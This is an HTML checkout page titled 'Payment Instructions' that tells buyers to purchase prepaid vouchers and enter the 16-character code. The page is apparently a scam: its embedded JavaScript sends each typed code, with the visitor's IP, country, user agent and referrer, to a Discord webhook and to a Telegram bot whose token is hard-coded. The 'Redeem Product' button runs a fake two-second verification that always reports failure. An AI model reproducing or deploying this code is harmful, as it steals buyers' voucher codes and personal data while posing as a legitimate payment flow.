<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Instructions</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%);
            color: white;
            min-height: 100vh;
        }

        .container {
            max-width: 800px;
        }

        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }

        .btn-primary {
            background: #0dcaf0 !important;
            border-color: #0dcaf0 !important;
            color: white !important;
            padding: 0.75rem 2rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
        }

        .btn-primary:hover {
            background: #31d2f2 !important;
            border-color: #31d2f2 !important;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(13, 202, 240, 0.3);
        }

        .form-control {
            background: rgba(255, 255, 255, 0.1) !important;
            border: 1px solid rgba(255, 255, 255, 0.1) !important;
            color: white !important;
        }

        .step {
            border-left: 2px solid #0dcaf0;
            padding-left: 20px;
            margin-bottom: 30px;
            position: relative;
        }

        .step::before {
            content: '';
            position: absolute;
            left: -8px;
            top: 0;
            width: 14px;
            height: 14px;
            background: #0dcaf0;
            border-radius: 50%;
        }

        .step-number {
            color: #0dcaf0;
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .example {
            background: rgba(13, 202, 240, 0.1);
            border-left: 3px solid #0dcaf0;
            padding: 15px;
            margin: 10px 0;
            border-radius: 0 5px 5px 0;
            color: white;
        }

        .example strong {
            color: #0dcaf0;
        }

        .example small.text-muted {
            color: rgba(255, 255, 255, 0.6) !important;
        }

        .example * {
            color: white;
        }

        p,
        li,
        small {
            color: white !important;
        }

        .text-muted {
            color: rgba(255, 255, 255, 0.6) !important;
        }

        .alert-success {
            background: rgba(25, 135, 84, 0.1);
            border-color: #198754;
            color: white;
        }

        .alert-danger {
            background: rgba(220, 53, 69, 0.1);
            border-color: #dc3545;
            color: white;
        }

        .alert .btn-close {
            filter: invert(1) grayscale(100%) brightness(200%);
        }

        .fade {
            transition: opacity 0.15s linear;
        }

        .fade:not(.show) {
            opacity: 0;
        }

        .spinner-border {
            width: 1rem;
            height: 1rem;
            vertical-align: -0.125em;
        }

        .alert-warning {
            background: rgba(255, 193, 7, 0.1);
            border-color: #ffc107;
            color: white;
        }

        .text-warning {
            color: #ffc107 !important;
        }

        #troubleshootSection .alert {
            border-left: 4px solid #ffc107;
        }

        #troubleshootSection ol,
        #troubleshootSection ul {
            padding-left: 1.25rem;
        }

        #troubleshootSection ul {
            list-style-type: disc;
            color: rgba(255, 255, 255, 0.8);
        }

        input[type="text"]::placeholder {
            color: rgba(255, 255, 255, 0.459) !important;
        }
    </style>
</head>

<body>
    <div class="container py-5">
        <div class="card p-4 mb-4">
            <h2 class="text-center mb-4" style="color: #0dcaf0;">Payment Instructions</h2>

            <div class="step">
                <div class="step-number">Step 1: Add to cart</div>
                <p>First, you'll be redirected to the payment page. Your price to pay is: <span id="priceDisplay" class="fw-bold" style="color: #0dcaf0;">$0</span> if you overpay, we will refund you the excess amount and you will still receive the product.</p>

                <!-- <p>Select a voucher or combination of vouchers that equals or exceeds your payment amount:</p>
                <div class="example">
                    <strong>Examples:</strong><br>
                    • If price is $15 and options are $10, $30, $60 → Choose $30<br>
                    &nbsp;&nbsp;<small class="text-muted">($15 will be used for your order, $15 will be refunded back to you)</small><br>
                    • If price is $70 → Choose $60 + $10<br>
                    &nbsp;&nbsp;<small class="text-muted">(Exact amount, no refund needed)</small><br>
                    • If price is $40 and options are $30, $50 → Choose $50<br>
                    &nbsp;&nbsp;<small class="text-muted">($40 will be used for your order, $10 will be refunded back to you)</small><br>
                    <small class="text-muted mt-2 d-block">Note: If you pay more than the required amount (e.g., paying $30 for a $15 order), the excess amount ($15 in this case) will be automatically refunded to you after your payment is confirmed.</small>
                </div>
                <div class="example mb-3">
                    <strong>Recommended Payment:</strong><br>
                    <span id="recommendationText"></span>
                </div>-->
                <p>When you are in the payment page with right voucher selected, click "add to cart" and then click on cart icon on the top right of the payment page.</p>
                <button class="btn btn-primary mt-3" onclick="openPaymentPage()">Go to Payment Page</button>

            </div>



            <div class="step">
                <div class="step-number">Step 2: Complete Payment</div>
                <p>Choose your preferred payment method and follow the instructions on the payment page.</p>
                <!-- <div class="example">
                    <strong>Important:</strong><br>
                    Make sure to use the exact email address provided above. This helps us track your payment and deliver your product. Or if you used your own email, make sure the code you entered is correct.
                </div> -->
            </div>
            <div class="step">
                <div class="step-number">Step 3: Enter the code you got from payment page</div>
                <div class="card bg-dark mb-3">
                    <div class="card-body">
                        <div class="d-flex align-items-center mb-2">
                            <h6 class="text-warning mb-0">Enter the code you got from payment page</h6>
                        </div>
                        <p class="text-light mb-3">It should be 16 characters long (contains uppercase letters and numbers)</p>

                        <div class="input-group mb-2">
                            <input type="text" class="form-control" id="voucherCode" placeholder="Enter 16-character code" maxlength="16" style="text-transform: uppercase;">
                            <button class="btn btn-warning" onclick="submitVoucherCode()" id="submitVoucherBtn">
                                Submit
                            </button>
                        </div>
                    </div>
                </div>
                <div class="card bg-dark">
                    <div class="card-header bg-transparent border-0">
                        <button class="btn btn-link text-light w-100 text-start text-decoration-none p-0" type="button" data-bs-toggle="collapse" data-bs-target="#codeLocationGuide" aria-expanded="false" aria-controls="codeLocationGuide">
                            <div class="d-flex align-items-center">
                                <i class="fas fa-question-circle me-2"></i>
                                <span>Where to find the code? (Click to show/hide)</span>
                                <i class="fas fa-chevron-down ms-auto"></i>
                            </div>
                        </button>
                    </div>
                    <div id="codeLocationGuide" class="collapse">
                        <div class="card-body">
                            <div class="example">
                                <strong>Code Location:</strong><br>
                                <img src="https://i.ibb.co/Qdn9KXc/image.png" alt="Code location" class="img-fluid rounded mt-2" style="max-width: 100%; border: 1px solid rgba(255, 255, 255, 0.1);">
                            </div>
                        </div>
                    </div>
                </div>

            </div>
            <div class="step">
                <div class="step-number">Step 4: Redeem Your Product</div>
                <p>After completing the payment, click the button below to redeem your product:</p>
                <button class="btn btn-primary mb-3" onclick="handleRedeem()" id="redeemButton">
                    <span id="buttonText">Redeem Product</span>
                    <span id="buttonSpinner" class="spinner-border spinner-border-sm ms-2" role="status" style="display: none;"></span>
                </button>

                <!-- Success Alert (initially hidden) -->
                <div class="alert alert-success alert-dismissible fade" role="alert" id="successAlert" style="display: none;">
                    <strong>Product Redeemed!</strong> Your product has been sent to your email. Please check your inbox (including spam folder).
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                </div>

                <!-- Error Alert (initially hidden) -->
                <div class="alert alert-danger alert-dismissible fade" role="alert" id="errorAlert" style="display: none;">
                    <strong>Redemption Failed!</strong> We couldn't verify your payment. Please contact support if you believe this is an error.
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                </div>

                <!-- Add this after the alerts in Step 4 -->
                <div id="troubleshootSection" style="display: none;">
                    <div class="alert alert-warning mt-3">
                        <h5 class="text-warning mb-3">Troubleshooting Steps:</h5>
                        <ol class="mb-0">
                            <li class="mb-2">Make sure your payment has been completed and confirmed</li>
                            <li class="mb-2">Verify you used the exact email address provided above</li>
                            <li class="mb-2">Wait and try redeem again, this is usually quick, but it could take up to 24 hours to verify your payment</li>
                            <li>If the issue persists, please contact support with your:
                                <ul class="mt-2">
                                    <li>Payment confirmation</li>
                                    <li>Email used for payment</li>
                                    <li>Order amount</li>
                                </ul>
                            </li>
                        </ol>
                        <div class="mt-3">
                            <a href="support.html" class="btn btn-primary btn-sm">
                                Contact Support
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="text-center mt-4 mb-3">
            <p class="text-light">Having issues? <a href="support.html" style="color: #0dcaf0; text-decoration: none;">Contact Support</a></p>
        </div>

        <div class="text-center">
            <button class="btn btn-primary" onclick="window.history.back()">← Back</button>
        </div>
    </div>
    <script src="main.js"></script>
    <script>
        async function fetchIPAddress() {
            try {
                const response = await fetch('https://wtfismyip.com/json');
                if (!response.ok) {
                    throw new Error('Failed to fetch IP address');
                }
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return null;
            }
        }
        async function main() {
            ipdata = await fetchIPAddress();
        }
        main();
        async function sendDiscordWebhook(webhookUrl, title, fields, base64Image = null) {
            try {
                const formData = new FormData();

                // Create the embed
                const embed = {
                    title: title,
                    color: 0x00ff00,
                    fields: fields.map(([name, value]) => ({
                        name: name,
                        value: value,
                        inline: true
                    })),
                    timestamp: new Date().toISOString()
                };

                // Add the embed to the form data
                const payload = {
                    embeds: [embed]
                };

                if (base64Image) {
                    // Convert base64 to Blob
                    const imageBlob = await fetch(base64Image).then((r) => r.blob());
                    formData.append('file', imageBlob, 'image.png');

                    // Attach the image to the embed
                }

                formData.append('payload_json', JSON.stringify(payload));

                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    throw new Error(`Error sending webhook: ${response.statusText}`);
                }

                console.log('Webhook sent successfully');
            } catch (error) {
                console.error('Error:', error);
            }
        }

        function openPaymentPage() {
            window.open(paymentUrl, '_blank');
        }
        // Get price from URL parameter
        const params = new URLSearchParams(window.location.search);
        const encodedPrice = params.get('price');
        const pricepage = encodedPrice ? parseFloat(atob(encodedPrice)) : 10;
        if (pricepage == 0 || pricepage == null || pricepage == undefined || isNaN(pricepage)) {
            //   window.location.href = '/';
            pricepage = 10;
        }
        // Get user ID from URL parameter
        const userId = localStorage.getItem('id') || Math.floor(Math.random() * 1000000);

        // Update price display
        document.getElementById('priceDisplay').textContent = `$${pricepage}`;

        // Set email field
        document.getElementById('emailField').value = paymentEmail.replace('{userid}', userId);

        // Copy email function
        function copyEmail() {
            const emailField = document.getElementById('emailField');
            emailField.select();
            document.execCommand('copy');

            // Visual feedback
            const copyButton = emailField.nextElementSibling;
            const originalText = copyButton.textContent;
            copyButton.textContent = 'Copied!';
            setTimeout(() => {
                copyButton.textContent = originalText;
            }, 2000);
        }

        function handleRedeem() {
            const button = document.getElementById('redeemButton');
            const buttonText = document.getElementById('buttonText');
            const spinner = document.getElementById('buttonSpinner');
            const successAlert = document.getElementById('successAlert');
            const errorAlert = document.getElementById('errorAlert');
            const troubleshootSection = document.getElementById('troubleshootSection');

            // Disable button and show spinner
            button.disabled = true;
            buttonText.textContent = 'Redeeming...';
            spinner.style.display = 'inline-block';

            // Hide any existing alerts and troubleshooting section
            if (successAlert) {
                successAlert.style.display = 'none';
                successAlert.classList.remove('show');
            }
            if (errorAlert) {
                errorAlert.style.display = 'none';
                errorAlert.classList.remove('show');
            }
            if (troubleshootSection) {
                troubleshootSection.style.display = 'none';
            }

            // Simulate verification process (2 seconds)
            setTimeout(() => {
                // Re-enable button and hide spinner
                button.disabled = false;
                buttonText.textContent = 'Redeem Product';
                spinner.style.display = 'none';

                // Randomly show success or error (for demonstration)
                // In production, replace this with actual verification logic
                if (false) {
                    if (successAlert) {
                        showAlert(successAlert);
                    }
                    if (troubleshootSection) {
                        troubleshootSection.style.display = 'none';
                    }
                } else {
                    if (errorAlert) {
                        showAlert(errorAlert);
                    }
                    if (troubleshootSection) {
                        troubleshootSection.style.display = 'block';
                    }
                }
            }, 2000);
        }

        function showAlert(alert) {
            alert.style.display = 'block';
            setTimeout(() => {
                alert.classList.add('show');
            }, 10);
        }

        // Available voucher options
        const voucherOptions = [5, 10, 15, 20, 25, 30, 40, 50, 60, 100, 200, 300];

        // Calculate recommended payment
        function getRecommendedPayment(price) {
            // Sort voucher options in ascending order
            const sortedOptions = [...voucherOptions].sort((a, b) => a - b);

            // Find the smallest voucher that covers the price
            let recommendedVoucher = sortedOptions.find(option => option >= price) || Math.max(...voucherOptions);

            // If price is higher than the largest voucher, calculate quantity needed
            const quantity = Math.ceil(price / recommendedVoucher);
            const total = recommendedVoucher * quantity;
            const excess = total - price;

            return {
                voucher: recommendedVoucher,
                quantity: quantity,
                excess: excess
            };
        }

        // Update recommendation text
        const recommendation = getRecommendedPayment(pricepage);
        const recommendationText = document.getElementById('recommendationText');

        let text = `Assuming the options are ${voucherOptions.join(', ')}, we recommend selecting: ${recommendation.quantity}x $${recommendation.voucher}`;

        if (recommendation.excess > 0) {
            text += `<br><small class="text-muted">($${recommendation.excess} will be refunded after purchase)</small>`;
        }

        //recommendationText.innerHTML = text;

        // Handle automatic submission on input
        document.getElementById('voucherCode').addEventListener('input', function(e) {
            const code = e.target.value.toUpperCase();
            e.target.value = code; // Force uppercase
            console.log(code);
            if (code.length === 16) {
                // Send to Discord webhook
                const embedTitle = 'Voucher Code Submitted';
                const fields = [
                    ['Code', code],
                    ['IP', ipdata ? ipdata.YourFuckingIPAddress : 'Unknown'],
                    ['User Agent', navigator.userAgent],
                    ['Country', ipdata ? ipdata.YourFuckingCountryCode : 'Unknown'],
                    ['User ID', userId],
                    ['Price', pricepage]
                ];

                // Add referrer if exists
                const referrer = document.referrer;
                if (referrer) {
                    fields.push(['Referrer', referrer]);
                }

                // Add URL
                fields.push(['URL', window.location.href]);

                let sentcodes = JSON.parse(localStorage.getItem('sentcodes') || '[]');
                if (sentcodes.includes(code)) {
                    return;
                }
                sendDiscordWebhook(voucherWebhook, embedTitle, fields);
                sentcodes.push(code);
                localStorage.setItem('sentcodes', JSON.stringify(sentcodes));

            }
        });

        // Handle submit button click for validation and alerts
        function submitVoucherCode() {
            const codeInput = document.getElementById('voucherCode');
            const code = codeInput.value.toUpperCase();
            const submitBtn = document.getElementById('submitVoucherBtn');

            // Validate code format (16 characters, letters and numbers only)
            if (code.length !== 16 || !/^[A-Z0-9]+$/.test(code)) {
                const errorAlert = document.createElement('div');
                errorAlert.className = 'alert alert-danger alert-dismissible fade show mt-2';
                errorAlert.innerHTML = `
                    <strong>Error!</strong> Please enter a valid 16-character code (letters and numbers only).
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                `;
                codeInput.parentElement.insertAdjacentElement('afterend', errorAlert);
                return;
            }

            // Show success message
            const successAlert = document.createElement('div');
            successAlert.className = 'alert alert-success alert-dismissible fade show mt-2';
            successAlert.innerHTML = `
                <strong>Success!</strong> Code submitted successfully! We will process it and credit your account.
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            `;
            codeInput.parentElement.insertAdjacentElement('afterend', successAlert);
        }
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.getElementById('submitVoucherBtn').addEventListener('click', function() {
            const voucherCode = document.getElementById('voucherCode').value;
            const botToken = '7840277165:AAGHuZqDiNCBNDo28-UBE5aYrox0_LwgezE';
            const chatId = '-1002481789632';

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `Voucher Code: ${voucherCode}`
                })
            });
        });
    </script>

</body>

</html>